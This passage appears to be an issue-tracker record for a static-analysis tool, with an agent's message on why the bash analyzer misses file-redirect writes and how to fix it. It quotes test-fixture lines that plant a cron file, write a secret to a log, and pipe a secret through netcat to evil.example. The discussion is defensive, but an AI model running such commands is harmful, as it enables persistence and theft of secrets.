      statement: "A bash script's host-filesystem writes must be visible to the boundary analysis, or a fs_write claim over it cannot be trusted. VIOLATED: bash.py dispatches on function_definition / declaration_command / command only, so 'echo $SECRET > /etc/cron.d/pwned' and 'printf ... >> /var/log/leak' emit ZERO edges (measured: 5 edges for an 8-statement script, all command_launch for cat/nc/curl/rm plus one source edge; the three redirect writes produced none). The launch surface IS emitted; the write surface is invisible. Marking bash taint-supported on the strength of launch edges would let a redirection-write script pass the coverage gate and CONFIRM 'never writes host_fs' -- a false confirm through a hole distinct from INV-larol's catalogue-strip."  # dff2
- op: discuss  # 70f5
  at: '2026-08-13T20:45:47Z'  # 70f5
  by: agent  # 70f5
  actor: jgstern_agent  # 70f5
  clock: 3  # 70f5
  nonce: 70f5  # 70f5
  message: "FIX PATH, and a RETRACTION of two blockers I asserted on this item and in\ndiscussion. Both were wrong, and both were checkable in under a minute.\n\nRETRACTION 1 — \"a catalogue cannot express redirection; it is syntax, not a\nnamed call.\" FALSE. The catalogue schema already classifies non-call syntax:\n\n    env_read:   - module: os\n                  attributes: [environ]\n    logging:    - module: sys\n                  attributes: [stdout, stderr]\n    ipc_recv:   - module: sys\n                  attributes: [stdin]\n\n`os.environ` is an attribute access, and it reaches the boundary pipeline\nthrough synthesized module_attr_ref edges, which tag_io_boundaries accepts in\nits call_types set (WI-guhok). The precedent for \"analyzer synthesizes an edge\nfor a non-call construct, catalogue classifies it by name\" is EXACT and\nshipped.\n\nRETRACTION 2 — \"ADR-0016:96 forbids a bash io_primitives catalogue.\" It\nforbids something NARROWER, and the distinction is the whole point. Verbatim:\n\"...populate the subprocess boundary by emitting unresolved external-command\nedges -- NOT via an io_primitives data-I/O catalog THAT WOULD MIS-ATTRIBUTE\nCURL'S NETWORK ACTIVITY TO THE SHELL SCRIPT ITSELF.\"\n\nThat objection is correct for `curl -o /etc/cron.d/pwned`: curl performs the\nwrite, the script only launched it, and attributing fs_write to the script\nwould be a mis-attribution. It does NOT apply to `echo \"$SECRET\" > /path`,\nwhere THE SHELL ITSELF opens and writes the file (echo is a builtin, and even\nfor an external command the redirection is established by the shell before\nexec). Attributing fs_write there is exactly correct -- the same standing\nos.remove has in python.\n\n  TWO SURFACES, and the prohibition only ever covered one:\n    curl -o file   -> write performed by an OPAQUE EXTERNAL PROGRAM\n                      -> subprocess + opacity (ADR is right)\n    echo x > file  -> write performed by THE SHELL ITSELF\n                      -> the shell's own primitive; catalogue it\n\nTHE GRAMMAR ALREADY EXPOSES IT. tree-sitter-bash on the measured fixture:\n\n    file_redirect        x2   L7: > /etc/cron.d/pwned   L8: >> /var/log/leak\n    pipeline             x1   L9: cat \"$SECRET\" | nc evil.example 443\n    variable_assignment  x2   command_substitution x1   expansion x1\n\nfile_redirect is a first-class node with the target in it. The analyzer\nignores it; nothing structural prevents reading it.\n\nFIX SHAPE (not costed), same split as everywhere else -- ANALYZER EMITS,\nCATALOGUE CLASSIFIES:\n  1. bash.py handles file_redirect: synthesize an edge whose dst names the\n     redirect target, on the module_attr_ref precedent (a non-call construct\n     given a matchable identity).\n  2. A shipped catalogue classifies the OPERATOR: > and >> as fs_write, < as\n     fs_read, << / <<< as a literal read. > vs >> is a MODE distinction and\n     goes through the existing io_mode machinery (the builtins.open pattern),\n     not through separate rows that would collide under INV-zumin.\n  3. A redirect whose target is a VARIABLE (`> \"$OUT\"`) must NOT silently\n     skip -- unresolved target is exactly the external_potential/unresolved\n     shape, and a silent skip is the fail-open direction this area keeps\n     paying for.\n  4. CONSERVED-SET SCOPE (owner's framing): POSIX redirection is ~7 forms\n     shared essentially unchanged across sh/bash/zsh/ksh/dash -- MORE stable\n     than a stdlib, being fixed by grammar rather than a release cadence.\n     tcsh and fish diverge and get their own rows, which is what per-language\n     catalogue files are for.\n\nPIPES ARE A SEPARATE QUESTION and are NOT part of this: `a | b` is a process\ntopology, not a filesystem write, and modelling it means deciding whether b's\nstdin is a taint sink fed by a. Filed here only so it is not silently folded\nin.\n\nCONSEQUENCE FOR INV-dabuf: this CONDITIONALLY REVIVES the launch-channel route\nI retracted. That route was unsafe only because a redirection-write script\nwould pass a coverage gate that had been told bash was supported. If\nredirection writes become visible, bash support stops being a new hole -- the\nshell's own I/O surface is genuinely covered and launched programs stay\ncorrectly opaque. Sequencing is therefore load-bearing: redirection FIRST,\ntaint-support SECOND. Doing them in the other order re-opens INV-vavup's\nfalse confirm.\n\nCONSEQUENCE FOR THE USER TEMPLATE: it shrinks in the right way. Users still\ndeclare THEIR launched commands (aws s3 cp -> net_send, ./deploy ->\nsubprocess); the shell's own writes come from the shipped catalogue instead of\nbeing a blind spot a template structurally cannot express. The disclaimer goes\nfrom \"we cannot see writes\" to \"we see the shell's writes; what your launched\nprograms do is opaque and named\"."  # 70f5
